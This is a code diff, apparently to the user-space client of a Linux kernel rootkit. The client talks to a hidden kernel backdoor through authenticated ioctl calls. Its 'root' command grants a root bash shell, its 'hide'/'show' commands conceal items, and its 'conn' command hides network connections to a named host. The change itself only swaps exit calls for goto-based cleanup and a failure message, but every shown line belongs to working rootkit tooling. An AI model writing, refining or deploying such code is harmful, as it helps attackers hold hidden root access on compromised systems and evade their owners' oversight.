@@ -35,13 +35,13 @@ int main(int argc, char **argv)
 
 	sockfd = socket(AF_INET, SOCK_STREAM, 6);
 	if (sockfd < 0)
-		exit(1);
+		goto fail;
 
 	if (strcmp(argv[1], "root") == 0) {
 		if (geteuid() == 0) {
 			printf("You are already root! :)\n\n");
 			close(sockfd);
-			exit(0);
+			goto out;
 		}
 
 		args.cmd = 3;
@@ -55,22 +55,25 @@ int main(int argc, char **argv)
 			printf("\e[01;36mYou got super powers!\e[00m\n\n");
 			execve(bash, arg, envp);
 		} else {
-			printf(
-			    "\e[00;31mYou have no power here! :( \e[00m\n\n");
+			printf("\e[00;31mYou have no power here! :( \e[00m\n\n");
 		}
+
+		goto out;
 	}
 
 	if (strcmp(argv[1], "hide") == 0 || strcmp(argv[1], "show") == 0) {
 		if (argc < 2)
-			exit(0);
+			goto fail;
 
 		if (argc == 2) {
 			args.cmd = 0;
 
 			if (ioctl(sockfd, AUTH, HTUA) == 0) {
 				if (ioctl(sockfd, AUTH, &args) == 0) {
-					if (ioctl(sockfd, AUTH, HTUA) == 0)
+					if (ioctl(sockfd, AUTH, HTUA) == 0) {
 						printf("\e[01;32mSuccess!\e[00m\n");
+						goto out;
+					}
 				}
 			}
 		} else {
@@ -81,8 +84,10 @@ int main(int argc, char **argv)
 
 			if (ioctl(sockfd, AUTH, HTUA) == 0) {
 				if (ioctl(sockfd, AUTH, &args) == 0) {
-					if (ioctl(sockfd, AUTH, HTUA) == 0)
+					if (ioctl(sockfd, AUTH, HTUA) == 0) {
 						printf("\e[01;32mSuccess!\e[00m\n");
+						goto out;
+					}
 				}
 			}
 		}
@@ -93,28 +98,30 @@ int main(int argc, char **argv)
 
 		if (ioctl(sockfd, AUTH, HTUA) == 0) {
 			if (ioctl(sockfd, AUTH, &args) == 0) {
-				if (ioctl(sockfd, AUTH, HTUA) == 0)
+				if (ioctl(sockfd, AUTH, HTUA) == 0) {
 					printf("\e[01;32mSuccess!\e[00m\n");
+					goto out;
+				}
 			}
 		}
 	}
 
 	if (strcmp(argv[1], "conn") == 0) {
 		if (argc < 4)
-			exit(0);
+			goto fail;
 
 		if (strcmp(argv[4], "hide") == 0) {
 			args.cmd = 4;
 		} else if (strcmp(argv[4], "show") == 0) {
 			args.cmd = 5;
 		} else {
-			exit(0);
+			goto fail;
 		}
 
 		host = gethostbyname(argv[2]);
 
 		if (host == NULL)
-			exit(0);
+			goto fail;
 
 		memcpy((void *)&addr.sin_addr, (void *)host->h_addr,
 		       host->h_length);
@@ -126,12 +133,17 @@ int main(int argc, char **argv)
 
 		if (ioctl(sockfd, AUTH, HTUA) == 0) {
 			if (ioctl(sockfd, AUTH, &args) == 0) {
-				if (ioctl(sockfd, AUTH, HTUA) == 0)
+				if (ioctl(sockfd, AUTH, HTUA) == 0) {
 					printf("\e[01;32mSuccess!\e[00m\n");
+					goto out;
+				}
 			}
 		}
 	}
 
+fail:
+	printf("\e[01;31mFailed!\e[00m\n");
+out:
 	close(sockfd);
-	return EXIT_SUCCESS;
+	return 0;
 }
